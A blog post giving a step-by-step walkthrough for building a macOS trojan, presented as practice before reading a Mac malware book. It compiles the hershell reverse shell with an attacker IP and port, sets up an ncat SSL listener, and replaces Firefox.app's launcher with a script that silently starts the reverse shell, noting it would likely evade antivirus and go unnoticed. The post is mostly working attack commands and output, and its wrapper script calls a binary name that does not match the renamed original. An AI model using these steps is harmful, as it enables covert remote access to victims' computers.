---
title: 'Building a MacOS Trojan'
layout: post
permalink: building-mac-trojan
tags: all, mac, cybersecurity
---

This article will outline a simple method I used for building and deploying malware on MacOS. I wanted to do this to prepare for reading Patrick Wardle's book [The Art of Mac Malware](https://taomm.org/).

## Setting up the Reverse Shell:

A simple reverse shell will serve as the base malicious payload that will be executed on the victim machine. I like this method because it is extremely simple and should evade antivirus.

I'm going to use [hershell](https://github.com/lesnuages/hershell), a very simple, cross-platform reverse shell client written in Go. I'll compile the client and server on an Arch Linux machine.

### Setup Hershell:

```bash
pacman -Sy --noconfirm go
```

Since I don't need the go environment to persist on my server, let's set the `GOPATH` variable to `/tmp/go` and grab hershell:

```bash
export GOPATH=/tmp/go
go get github.com/lesnuages/hershell
go get github.com/lesnuages/hershell/shell
```

### Compile Hershell for MacOS Victim:

Now prepare and compile hershell for the MacOS victim (change the `LHOST` and `LPORT` variables to your attacking machine/server):

```bash
cd /tmp/go/src/github.com/lesnuages/hershell/
make depends

make macos64 LHOST=192.168.1.50 LPORT=5000
```

The MacOS binary for the victim machine should now be available at `/tmp/go/src/github.com/lesnuages/hershell/hershell`:

```bash
❯ file /tmp/go/src/github.com/lesnuages/hershell/hershell
/tmp/go/src/github.com/lesnuages/hershell/hershell: Mach-O 64-bit x86_64 executable
```

### Setup the Malicious Listener on Server:

Generate the server certificate for hershell and install nmap so that we can use `ncat` as the listener on the attacking server:

```bash
cd /tmp/go/src/github.com/lesnuages/hershell/
make depends

pacman -Sy --noconfirm nmap
```

Then run the listener on the attacking machine:

```bash
ncat --ssl --ssl-cert /tmp/go/src/github.com/lesnuages/hershell/server.pem --ssl-key /tmp/go/src/github.com/lesnuages/hershell/server.key -lvp 5000
```

This is what it looks like when a session is established:

```bash
❯ ncat --ssl --ssl-cert /tmp/go/src/github.com/lesnuages/hershell/server.pem --ssl-key /tmp/go/src/github.com/lesnuages/hershell/server.key -lvp 5000
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::5000
Ncat: Listening on 0.0.0.0:5000
Ncat: Connection from 192.168.1.2.
Ncat: Connection from 192.168.1.2:52866.
[hershell]> whoami
heywoodlh
[hershell]> echo $HOSTNAME
unix-machine
```


## Trojanize an Application:

I'm going to trojanize Firefox since I use Firefox a ton. This method is super simplistic, but it gets the job done. And most likely, it wouldn't be detected unless a user was vigilant.

I'm going to perform the following commands on a Mac with Firefox already installed. You could replace Firefox with another application if you wanted to.

Copy Firefox.app:

```bash
cp -r /Applications/Firefox.app /tmp/Firefox-trojan.app
```

Place the `hershell` binary that you created on the attacking server in `/tmp/Firefox-trojan.app/Contents/MacOS`.

Rename the original Firefox binary file:

```bash
cd /tmp/Firefox-trojan.app/Contents/MacOS
mv firefox firefox.orig
```

Now create a shell script in place of the `firefox` binary that will run hershell and then will run the original `firefox` binary:

```bash
touch firefox
chmod +x firefox
```

Then add the following content to the new `firefox` file:

```bash
#!/usr/bin/env bash

full_path=$(dirname $(realpath $0))

/usr/bin/screen -dmS reverse-shell ${full_path}/hershell

${full_path}/firefox-bin
```

This method will use the `screen` command to run hershell in the background with a session name of `reverse-shell`. This method is not discrete at all, but I don't really care in this case.


## Profit:

When the Firefox-trojan.app is opened, it should attempt to create a reverse shell with the attacking server that is listening for a connection.

![alt text](https://raw.githubusercontent.com/heywoodlh/the-empire.systems/master/images/trojan-firefox.png "Trojanized Firefox")

